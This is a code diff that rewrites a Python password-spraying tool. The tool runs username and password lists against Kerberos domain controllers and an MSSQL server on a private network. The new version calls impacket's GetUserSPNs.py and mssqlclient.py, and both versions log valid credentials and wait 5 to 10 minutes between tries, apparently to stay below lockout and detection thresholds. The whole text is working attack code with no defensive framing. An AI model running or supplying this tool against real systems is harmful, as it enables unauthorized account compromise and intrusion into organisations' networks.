@@ -1,67 +1,68 @@
-import random
+import subprocess
 import time
-from datetime import datetime
-from impacket.krb5.asreq import getKerberosTGT
-from impacket.krb5.types import Principal
-from impacket.krb5 import constants
-import pymssql
+import random
+from pathlib import Path
 
-# === CONFIG ===
-USERNAME_FILE = 'usernames.txt'
-PASSWORD_FILE = 'passwords.txt'
-OUTPUT_FILE = 'spray_results.log'
+# ========== Configuration ==========
+usernames_file = "usernames.txt"
+passwords_file = "passwords.txt"
+output_file = "spray_output.txt"
 
-KERBEROS_DCS = ['192.168.1.2', '192.168.1.24']
-MSSQL_HOST = '192.168.1.22'
-MIN_DELAY = 300  # 5 minutes
-MAX_DELAY = 600  # 10 minutes
-# ==============
+kerberos_targets = ["192.168.1.2", "192.168.1.24"]
+mssql_target = "192.168.1.22"
+domain = <placeholder>
 
-def log_result(line):
-    with open(OUTPUT_FILE, 'a') as f:
-        f.write(f"[{datetime.now().isoformat()}] {line}\n")
+min_delay = 300  # 5 minutes
+max_delay = 600  # 10 minutes
+# ===================================
 
-def spray_kerberos(domain, username, password):
-    for dc in KERBEROS_DCS:
+def log_result(tool_name, user, password, output):
+    with open(output_file, "a") as f:
+        f.write(f"[{tool_name}] {user}:{password}\n{output}\n{'='*50}\n")
+
+def run_kerberos(user, password):
+    for dc in kerberos_targets:
         try:
-            principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-            getKerberosTGT(principal, password, domain, dc)
-            log_result(f"[+] VALID KERBEROS: {domain}\\{username}:{password}")
+            command = [
+                "GetUserSPNs.py",
+                f"{domain}/{user}:{password}",
+                f"-dc-ip", dc
+            ]
+            result = subprocess.run(command, capture_output=True, text=True, timeout=60)
+            log_result(f"Kerberos@{dc}", user, password, result.stdout + result.stderr)
         except Exception as e:
-            if "KDC_ERR_PREAUTH_FAILED" in str(e):
-                log_result(f"[-] INVALID KERBEROS: {domain}\\{username}:{password}")
-            else:
-                log_result(f"[!] ERROR (KRB) {domain}\\{username}:{password} - {e}")
+            log_result(f"Kerberos@{dc}", user, password, f"Error: {str(e)}")
 
-def spray_mssql(username, password):
+def run_mssql(user, password):
     try:
-        conn = pymssql.connect(server=MSSQL_HOST, user=username, password=password, login_timeout=5)
-        conn.close()
-        log_result(f"[+] VALID MSSQL: {username}:{password}")
-    except pymssql.OperationalError:
-        log_result(f"[-] INVALID MSSQL: {username}:{password}")
+        command = [
+            "mssqlclient.py",
+            f"{domain}/{user}:{password}@{mssql_target}",
+            "-windows-auth"
+        ]
+        result = subprocess.run(command, capture_output=True, text=True, timeout=60)
+        log_result(f"MSSQL@{mssql_target}", user, password, result.stdout + result.stderr)
     except Exception as e:
-        log_result(f"[!] ERROR (MSSQL) {username}:{password} - {e}")
+        log_result(f"MSSQL@{mssql_target}", user, password, f"Error: {str(e)}")
 
 def main():
-    domain = input("Enter domain name (e.g. XONGROUP): ").strip()
+    if not Path(usernames_file).exists() or not Path(passwords_file).exists():
+        print("Username or password file not found.")
+        return
 
-    with open(USERNAME_FILE) as f:
-        usernames = [line.strip() for line in f if line.strip()]
-
-    with open(PASSWORD_FILE) as f:
-        passwords = [line.strip() for line in f if line.strip()]
+    with open(usernames_file, "r") as uf, open(passwords_file, "r") as pf:
+        usernames = [u.strip() for u in uf if u.strip()]
+        passwords = [p.strip() for p in pf if p.strip()]
 
     for password in passwords:
-        log_result(f"\n[*] Attempting password: {password}")
-        for i in range(0, len(usernames), 5):
-            batch = usernames[i:i+5]
-            for username in batch:
-                spray_kerberos(domain, username, password)
-                spray_mssql(username, password)
-            delay = random.randint(MIN_DELAY, MAX_DELAY)
-            log_result(f"[*] Sleeping {delay} seconds before next batch...\n")
-            time.sleep(delay)
+        for user in usernames:
+            print(f"[*] Trying {user}:{password}")
+            run_kerberos(user, password)
+            run_mssql(user, password)
+
+            sleep_time = random.randint(min_delay, max_delay)
+            print(f"[+] Sleeping for {sleep_time // 60} minutes...")
+            time.sleep(sleep_time)
 
 if __name__ == "__main__":
     main()
